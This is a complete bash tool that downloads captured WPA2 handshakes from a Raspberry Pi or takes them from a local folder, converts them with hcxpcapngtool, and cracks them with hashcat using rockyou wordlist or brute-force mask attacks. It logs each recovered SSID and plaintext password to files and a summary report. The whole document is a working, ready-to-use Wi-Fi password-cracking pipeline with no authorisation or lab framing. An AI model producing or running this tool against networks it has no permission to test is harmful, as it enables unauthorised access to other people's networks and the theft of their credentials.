#!/bin/bash

# WPA2 Handshake Cracker Script
# This script downloads handshakes from a Raspberry Pi, converts them, and runs hashcat

# Configuration variables
PI_HOST="${PI_HOST:-pi@raspberrypi.local}"
PI_HANDSHAKES_DIR="/home/pi/handshakes"
LOCAL_DOWNLOAD_DIR="${LOCAL_DOWNLOAD_DIR:-${HOME}/Downloads/handshakes}"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
TEMP_TAR="handshakes_${TIMESTAMP}.tar.gz"
WORDLIST="${WORDLIST:-~/wordlist/rockyou.txt}"
# Expand tilde in wordlist path
WORDLIST="${WORDLIST/#\~/$HOME}"
HASHCAT_MODE="22000"  # Mode for WPA/WPA2 PMKID/EAPOL
CRACKED_DIR="${LOCAL_DOWNLOAD_DIR}/cracked"
LOG_FILE="${LOCAL_DOWNLOAD_DIR}/wpa2crack_${TIMESTAMP}.log"

# Source mode: remote (download from Pi) or local (use local directory)
SOURCE_MODE="${SOURCE_MODE:-remote}"  # remote or local
LOCAL_PCAP_DIR="${LOCAL_PCAP_DIR:-}"  # Path to local PCAP files (required for local mode)
# Expand tilde in local PCAP directory path
LOCAL_PCAP_DIR="${LOCAL_PCAP_DIR/#\~/$HOME}"

# Hashcat attack configuration
ATTACK_MODE="${ATTACK_MODE:-wordlist}"  # wordlist or bruteforce
GPU_MODE="${GPU_MODE:-0}"  # 0=CPU, 1=GPU only, 2=GPU with high performance (workload 3)
BRUTE_PATTERN="${BRUTE_PATTERN:-?u?l?l?l?l?l?l?l}"  # Default 8 chars: 1 upper + 7 lower
MIN_LENGTH="${MIN_LENGTH:-8}"  # Minimum password length for brute force
MAX_LENGTH="${MAX_LENGTH:-8}"  # Maximum password length for brute force

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[!]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[*]${NC} $1"
}

# Function to display help
show_help() {
    echo "WPA2 Handshake Cracker v1.0"
    echo "==========================="
    echo ""
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Environment Variables:"
    echo "  SOURCE_MODE     - Source mode: remote or local (default: remote)"
    echo "  LOCAL_PCAP_DIR  - Path to local PCAP files (required for local mode)"
    echo "  PI_HOST         - SSH connection string (default: pi@raspberrypi.local)"
    echo "  ATTACK_MODE     - Attack mode: wordlist or bruteforce (default: wordlist)"
    echo "  WORDLIST        - Path to wordlist file (default: ~/wordlist/rockyou.txt)"
    echo "  GPU_MODE        - GPU acceleration mode (default: 0)"
    echo "                    0 = CPU mode"
    echo "                    1 = GPU only"
    echo "                    2 = GPU with high performance (workload 3)"
    echo "  BRUTE_PATTERN   - Mask pattern for brute force (default: ?u?l?l?l?l?l?l?l)"
    echo "  MIN_LENGTH      - Minimum password length for brute force (default: 8)"
    echo "  MAX_LENGTH      - Maximum password length for brute force (default: 8)"
    echo ""
    echo "Examples:"
    echo "  # Basic wordlist attack (download from Pi)"
    echo "  ./wpa2crack.sh"
    echo ""
    echo "  # Use local PCAP files"
    echo "  SOURCE_MODE=local LOCAL_PCAP_DIR=/path/to/pcaps ./wpa2crack.sh"
    echo ""
    echo "  # GPU accelerated wordlist attack"
    echo "  GPU_MODE=2 ./wpa2crack.sh"
    echo ""
    echo "  # Brute force 8-digit numbers"
    echo "  ATTACK_MODE=bruteforce BRUTE_PATTERN='?d?d?d?d?d?d?d?d' ./wpa2crack.sh"
    echo ""
    echo "  # Local files with GPU brute force"
    echo "  SOURCE_MODE=local LOCAL_PCAP_DIR=./captures ATTACK_MODE=bruteforce GPU_MODE=2 ./wpa2crack.sh"
    echo ""
    echo "Hashcat Mask Characters:"
    echo "  ?l = lowercase letters (a-z)"
    echo "  ?u = uppercase letters (A-Z)"
    echo "  ?d = digits (0-9)"
    echo "  ?s = special characters"
    echo "  ?a = all characters"
    echo ""
    exit 0
}

# Function to check if required tools are installed
check_requirements() {
    print_status "Checking requirements..."
    
    local missing_tools=()
    
    # Check for required tools
    command -v hcxpcapngtool >/dev/null 2>&1 || missing_tools+=("hcxpcapngtool")
    command -v hashcat >/dev/null 2>&1 || missing_tools+=("hashcat")
    command -v tar >/dev/null 2>&1 || missing_tools+=("tar")
    command -v xxd >/dev/null 2>&1 || missing_tools+=("xxd")
    
    # Only check SSH tools if using remote mode
    if [ "$SOURCE_MODE" = "remote" ]; then
        command -v ssh >/dev/null 2>&1 || missing_tools+=("ssh")
        command -v scp >/dev/null 2>&1 || missing_tools+=("scp")
    fi
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        print_error "Missing required tools: ${missing_tools[*]}"
        print_error "Please install missing tools before running this script."
        exit 1
    fi
    
    # Check if wordlist exists (only for wordlist mode)
    if [ "$ATTACK_MODE" = "wordlist" ]; then
        if [ ! -f "$WORDLIST" ]; then
            print_warning "Wordlist not found at: $WORDLIST"
            print_warning "Please set WORDLIST environment variable or install rockyou.txt"
            exit 1
        fi
        print_status "Wordlist found: $WORDLIST"
    else
        print_status "Brute force mode selected - skipping wordlist check"
    fi
    
    # Validate attack mode
    if [ "$ATTACK_MODE" != "wordlist" ] && [ "$ATTACK_MODE" != "bruteforce" ]; then
        print_error "Invalid ATTACK_MODE: $ATTACK_MODE (must be 'wordlist' or 'bruteforce')"
        exit 1
    fi
    
    # Validate source mode and check requirements
    if [ "$SOURCE_MODE" != "remote" ] && [ "$SOURCE_MODE" != "local" ]; then
        print_error "Invalid SOURCE_MODE: $SOURCE_MODE (must be 'remote' or 'local')"
        exit 1
    fi
    
    if [ "$SOURCE_MODE" = "local" ]; then
        if [ -z "$LOCAL_PCAP_DIR" ]; then
            print_error "LOCAL_PCAP_DIR must be set when using local mode"
            exit 1
        fi
        if [ ! -d "$LOCAL_PCAP_DIR" ]; then
            print_error "Local PCAP directory not found: $LOCAL_PCAP_DIR"
            exit 1
        fi
        # Check if there are any PCAP files
        if ! ls "$LOCAL_PCAP_DIR"/*.pcap >/dev/null 2>&1 && ! ls "$LOCAL_PCAP_DIR"/*.pcapng >/dev/null 2>&1; then
            print_error "No PCAP or PCAPNG files found in: $LOCAL_PCAP_DIR"
            exit 1
        fi
    fi
    
    print_status "All requirements satisfied!"
}

# Function to create necessary directories
setup_directories() {
    print_status "Setting up directories..."
    mkdir -p "${LOCAL_DOWNLOAD_DIR}"
    mkdir -p "${LOCAL_DOWNLOAD_DIR}/pcap"
    mkdir -p "${LOCAL_DOWNLOAD_DIR}/hc22000"
    mkdir -p "${CRACKED_DIR}"
    mkdir -p "${LOCAL_DOWNLOAD_DIR}/logs"
}

# Function to create tar archive on Pi
create_remote_tar() {
    print_status "Creating tar archive on Raspberry Pi..."
    
    # Check if handshakes directory exists on Pi
    if ! ssh "$PI_HOST" "[ -d $PI_HANDSHAKES_DIR ]"; then
        print_error "Handshakes directory not found on Pi: $PI_HANDSHAKES_DIR"
        exit 1
    fi
    
    # Create tar archive on Pi
    if ssh "$PI_HOST" "cd $PI_HANDSHAKES_DIR && tar -czf /tmp/$TEMP_TAR *.pcap *.pcapng 2>/dev/null"; then
        print_status "Tar archive created successfully"
    else
        print_warning "No pcap files found or error creating archive"
        # Check if there are any pcap files
        local pcap_count=$(ssh "$PI_HOST" "find $PI_HANDSHAKES_DIR \( -name '*.pcap' -o -name '*.pcapng' \) 2>/dev/null | wc -l")
        if [ "$pcap_count" -eq 0 ]; then
            print_error "No pcap or pcapng files found in $PI_HANDSHAKES_DIR"
            exit 1
        fi
    fi
}

# Function to download tar archive
download_tar() {
    print_status "Downloading tar archive from Raspberry Pi..."
    
    if scp "$PI_HOST:/tmp/$TEMP_TAR" "${LOCAL_DOWNLOAD_DIR}/$TEMP_TAR"; then
        print_status "Download completed successfully"
        
        # Remove tar from Pi to save space
        ssh "$PI_HOST" "rm -f /tmp/$TEMP_TAR"
        print_status "Cleaned up temporary file on Pi"
    else
        print_error "Failed to download tar archive"
        exit 1
    fi
}

# Function to extract tar archive
extract_tar() {
    print_status "Extracting tar archive..."
    
    cd "${LOCAL_DOWNLOAD_DIR}"
    if tar -xzf "$TEMP_TAR" -C pcap/; then
        print_status "Extraction completed successfully"
        rm -f "$TEMP_TAR"
    else
        print_error "Failed to extract tar archive"
        exit 1
    fi
}

# Function to copy local PCAP files
copy_local_pcap_files() {
    print_status "Copying PCAP files from local directory: $LOCAL_PCAP_DIR"
    
    local copied_count=0
    
    # Copy all PCAP and PCAPNG files to the pcap directory
    for pcap_file in "$LOCAL_PCAP_DIR"/*.pcap "$LOCAL_PCAP_DIR"/*.pcapng; do
        if [ -f "$pcap_file" ]; then
            cp "$pcap_file" "${LOCAL_DOWNLOAD_DIR}/pcap/"
            ((copied_count++))
        fi
    done
    
    if [ $copied_count -eq 0 ]; then
        print_error "No PCAP or PCAPNG files found to copy"
        exit 1
    fi
    
    print_status "Copied $copied_count PCAP/PCAPNG files successfully"
}

# Function to convert pcap to hc22000
convert_pcap_files() {
    print_status "Converting pcap files to hc22000 format..."
    
    local converted_count=0
    local failed_count=0
    
    # Create conversion log
    local convert_log="${LOCAL_DOWNLOAD_DIR}/logs/conversion_${TIMESTAMP}.log"
    echo "Conversion started at $(date)" > "$convert_log"
    
    # First, create a combined hc22000 file from all pcap/pcapng files
    print_status "Creating combined.hc22000 file..."
    
    # Build file list for hcxpcapngtool
    local pcap_files=()
    for pcap_file in "${LOCAL_DOWNLOAD_DIR}/pcap"/*.pcap "${LOCAL_DOWNLOAD_DIR}/pcap"/*.pcapng; do
        if [ -f "$pcap_file" ]; then
            pcap_files+=("$pcap_file")
        fi
    done
    
    if [ ${#pcap_files[@]} -eq 0 ]; then
        print_error "No PCAP/PCAPNG files found to convert"
        return 1
    fi
    
    # Convert all files at once with hcxpcapngtool
    local combined_output="${LOCAL_DOWNLOAD_DIR}/hc22000/combined.hc22000"
    
    print_status "Converting ${#pcap_files[@]} files with hcxpcapngtool..."
    if hcxpcapngtool -o "$combined_output" "${pcap_files[@]}" >> "$convert_log" 2>&1; then
        print_status "Successfully created combined.hc22000"
        converted_count=${#pcap_files[@]}
        
        # Also create individual files for each pcap
        for pcap_file in "${pcap_files[@]}"; do
            if [ -f "$pcap_file" ]; then
                # Get basename without extension
                local filename=$(basename "$pcap_file")
                local basename="${filename%.*}"
                local output_file="${LOCAL_DOWNLOAD_DIR}/hc22000/${basename}.hc22000"
                
                print_status "Creating individual file: ${basename}.hc22000"
                
                # Convert individual file
                if hcxpcapngtool -o "$output_file" "$pcap_file" >> "$convert_log" 2>&1; then
                    echo "[SUCCESS] Converted: $filename" >> "$convert_log"
                else
                    echo "[FAILED] Could not convert: $filename" >> "$convert_log"
                    print_warning "Failed to convert: $filename"
                    ((failed_count++))
                fi
            fi
        done
    else
        print_error "Failed to create combined.hc22000 file"
        return 1
    fi
    
    print_status "Conversion completed: $converted_count successful, $failed_count failed"
}

# Function to extract SSID from pcap filename or content
get_ssid_from_file() {
    local hc_file="$1"
    local basename=$(basename "$hc_file" .hc22000)
    
    # Look for corresponding pcap or pcapng file
    local pcap_file=""
    if [ -f "${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcap" ]; then
        pcap_file="${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcap"
    elif [ -f "${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcapng" ]; then
        pcap_file="${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcapng"
    fi
    
    # Try to extract SSID from filename first (common pwnagotchi format)
    if [ -n "$pcap_file" ]; then
        local filename="${basename}"
        if [[ "$filename" =~ ^(.+)_[0-9a-fA-F]{12}$ ]]; then
            echo "${BASH_REMATCH[1]}"
            return
        fi
    fi
    
    # If not in filename, try to extract from the hc22000 file
    # The format includes SSID in hex, we'll try to extract and convert it
    if [ -f "$hc_file" ]; then
        # Extract SSID from hc22000 format (field 6 contains SSID in hex)
        local ssid_hex=$(cut -d'*' -f6 "$hc_file" 2>/dev/null | head -1)
        if [ -n "$ssid_hex" ]; then
            # Convert hex to ASCII
            echo -n "$ssid_hex" | xxd -r -p 2>/dev/null || echo "unknown_ssid"
        else
            echo "unknown_ssid"
        fi
    else
        echo "unknown_ssid"
    fi
}

# Function to build hashcat command based on configuration
build_hashcat_command() {
    local hc_file="$1"
    local output_file="$2"
    local cmd="hashcat -m $HASHCAT_MODE"
    
    # Set attack mode
    if [ "$ATTACK_MODE" = "wordlist" ]; then
        cmd="$cmd -a 0 \"$hc_file\" \"$WORDLIST\""
    else
        # Brute force mode
        cmd="$cmd -a 3 \"$hc_file\" \"$BRUTE_PATTERN\""
        cmd="$cmd --increment --increment-min=$MIN_LENGTH --increment-max=$MAX_LENGTH"
    fi
    
    # Add GPU options
    case "$GPU_MODE" in
        1)
            cmd="$cmd -d 1"  # GPU only
            ;;
        2)
            cmd="$cmd -d 1 -w 3"  # GPU with high performance (workload 3)
            ;;
        *)
            # Default: CPU mode, no additional flags
            ;;
    esac
    
    # Add common options
    cmd="$cmd --outfile=\"$output_file\""
    cmd="$cmd --outfile-format=2"
    cmd="$cmd --quiet"
    cmd="$cmd --potfile-disable"
    
    echo "$cmd"
}

# Function to run hashcat on converted files
crack_handshakes() {
    print_status "Starting hashcat attack on converted handshakes..."
    
    local cracked_count=0
    local hashcat_log="${LOCAL_DOWNLOAD_DIR}/logs/hashcat_${TIMESTAMP}.log"
    
    # Process each hc22000 file
    for hc_file in "${LOCAL_DOWNLOAD_DIR}/hc22000"/*.hc22000; do
        if [ -f "$hc_file" ] && [ "$(basename "$hc_file")" != "combined.hc22000" ]; then
            local basename=$(basename "$hc_file" .hc22000)
            local ssid=$(get_ssid_from_file "$hc_file")
            
            print_status "Cracking: $basename (SSID: $ssid)"
            
            # Run hashcat
            local output_file="${LOCAL_DOWNLOAD_DIR}/hashcat_output_${basename}.txt"
            local hashcat_cmd=$(build_hashcat_command "$hc_file" "$output_file")
            
            print_status "Attack mode: $ATTACK_MODE | GPU mode: $GPU_MODE"
            if [ "$ATTACK_MODE" = "bruteforce" ]; then
                print_status "Brute force pattern: $BRUTE_PATTERN (length: $MIN_LENGTH-$MAX_LENGTH)"
            fi
            
            if eval "$hashcat_cmd 2>> \"$hashcat_log\""; then
                
                # Check if password was cracked
                if [ -s "$output_file" ]; then
                    local password=$(cut -d':' -f2 "$output_file")
                    
                    # Determine original file extension
                    local source_file=""
                    if [ -f "${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcap" ]; then
                        source_file="$basename.pcap"
                    elif [ -f "${LOCAL_DOWNLOAD_DIR}/pcap/${basename}.pcapng" ]; then
                        source_file="$basename.pcapng"
                    else
                        source_file="$basename"
                    fi
                    
                    # Save to .cracked file
                    local cracked_file="${CRACKED_DIR}/${ssid}.cracked"
                    echo "SSID: $ssid" >> "$cracked_file"
                    echo "Password: $password" >> "$cracked_file"
                    echo "Cracked on: $(date)" >> "$cracked_file"
                    echo "Source file: $source_file" >> "$cracked_file"
                    echo "---" >> "$cracked_file"
                    
                    print_status "CRACKED! SSID: $ssid | Password: $password"
                    ((cracked_count++))
                else
                    print_warning "Failed to crack: $basename"
                fi
                
                # Clean up output file
                rm -f "$output_file"
            else
                print_error "Hashcat error for: $basename (check log for details)"
            fi
        fi
    done
    
    # Also try the combined file for better performance
    if [ -f "${LOCAL_DOWNLOAD_DIR}/hc22000/combined.hc22000" ]; then
        print_status "Running hashcat on combined file..."
        
        local combined_output="${LOCAL_DOWNLOAD_DIR}/hashcat_combined_output.txt"
        
        # Build hashcat command for combined file
        local cmd="hashcat -m $HASHCAT_MODE"
        
        if [ "$ATTACK_MODE" = "wordlist" ]; then
            cmd="$cmd -a 0 \"${LOCAL_DOWNLOAD_DIR}/hc22000/combined.hc22000\" \"$WORDLIST\""
        else
            cmd="$cmd -a 3 \"${LOCAL_DOWNLOAD_DIR}/hc22000/combined.hc22000\" \"$BRUTE_PATTERN\""
            cmd="$cmd --increment --increment-min=$MIN_LENGTH --increment-max=$MAX_LENGTH"
        fi
        
        # Add GPU options
        case "$GPU_MODE" in
            1) cmd="$cmd -d 1" ;;
            2) cmd="$cmd -d 1 -w 3" ;;
        esac
        
        cmd="$cmd --outfile=\"$combined_output\" --outfile-format=3 --quiet --potfile-disable"
        
        eval "$cmd 2>> \"$hashcat_log\""
        
        # Process combined results
        if [ -s "$combined_output" ]; then
            while IFS=':' read -r hash password; do
                # Extract SSID from the hash line
                local ssid_hex=$(echo "$hash" | cut -d'*' -f6)
                local ssid=$(echo -n "$ssid_hex" | xxd -r -p 2>/dev/null || echo "unknown")
                
                # Save to .cracked file
                local cracked_file="${CRACKED_DIR}/${ssid}.cracked"
                echo "SSID: $ssid" >> "$cracked_file"
                echo "Password: $password" >> "$cracked_file"
                echo "Cracked on: $(date)" >> "$cracked_file"
                echo "Source: combined.hc22000" >> "$cracked_file"
                echo "---" >> "$cracked_file"
                
                print_status "CRACKED! SSID: $ssid | Password: $password"
            done < "$combined_output"
        fi
        
        rm -f "$combined_output"
    fi
    
    print_status "Cracking completed. Total cracked: $cracked_count"
}

# Function to generate summary report
generate_report() {
    print_status "Generating summary report..."
    
    local report_file="${LOCAL_DOWNLOAD_DIR}/report_${TIMESTAMP}.txt"
    
    {
        echo "WPA2 Handshake Cracking Report"
        echo "==============================="
        echo "Generated on: $(date)"
        echo ""
        echo "Configuration:"
        echo "- Source Mode: $SOURCE_MODE"
        if [ "$SOURCE_MODE" = "remote" ]; then
            echo "- Pi Host: $PI_HOST"
        else
            echo "- Local PCAP Directory: $LOCAL_PCAP_DIR"
        fi
        echo "- Attack Mode: $ATTACK_MODE"
        if [ "$ATTACK_MODE" = "wordlist" ]; then
            echo "- Wordlist: $WORDLIST"
        else
            echo "- Brute Force Pattern: $BRUTE_PATTERN"
            echo "- Password Length: $MIN_LENGTH-$MAX_LENGTH characters"
        fi
        echo "- GPU Mode: $GPU_MODE (0=CPU, 1=GPU, 2=GPU high performance)"
        echo ""
        echo "Statistics:"
        echo "- PCAP/PCAPNG files downloaded: $(find "${LOCAL_DOWNLOAD_DIR}/pcap" \( -name "*.pcap" -o -name "*.pcapng" \) | wc -l)"
        echo "- Successfully converted: $(find "${LOCAL_DOWNLOAD_DIR}/hc22000" -name "*.hc22000" ! -name "combined.hc22000" | wc -l)"
        echo "- Passwords cracked: $(find "${CRACKED_DIR}" -name "*.cracked" | wc -l)"
        echo ""
        echo "Cracked Networks:"
        echo "-----------------"
        
        for cracked_file in "${CRACKED_DIR}"/*.cracked; do
            if [ -f "$cracked_file" ]; then
                echo ""
                head -2 "$cracked_file"
            fi
        done
        
        echo ""
        echo "Log files:"
        echo "- Conversion log: ${LOCAL_DOWNLOAD_DIR}/logs/conversion_${TIMESTAMP}.log"
        echo "- Hashcat log: ${LOCAL_DOWNLOAD_DIR}/logs/hashcat_${TIMESTAMP}.log"
        
    } > "$report_file"
    
    print_status "Report saved to: $report_file"
    
    # Display summary
    echo ""
    cat "$report_file"
}

# Main execution
main() {
    # Check for help flag
    if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
        show_help
    fi
    
    echo "WPA2 Handshake Cracker v1.0"
    echo "==========================="
    echo ""
    
    # Ensure log directory exists before starting logging
    mkdir -p "$(dirname "$LOG_FILE")"
    
    # Start logging
    exec > >(tee -a "$LOG_FILE")
    exec 2>&1
    
    # Check requirements
    check_requirements
    
    # Setup directories
    setup_directories
    
    # Get PCAP files based on source mode
    if [ "$SOURCE_MODE" = "remote" ]; then
        print_status "Using remote mode - downloading from Raspberry Pi"
        create_remote_tar
        download_tar
        extract_tar
    else
        print_status "Using local mode - copying from: $LOCAL_PCAP_DIR"
        copy_local_pcap_files
    fi
    
    # Convert files
    convert_pcap_files
    
    # Crack handshakes
    crack_handshakes
    
    # Generate report
    generate_report
    
    print_status "All operations completed!"
    print_status "Check ${CRACKED_DIR} for cracked passwords"
}

# Run main function
main "$@"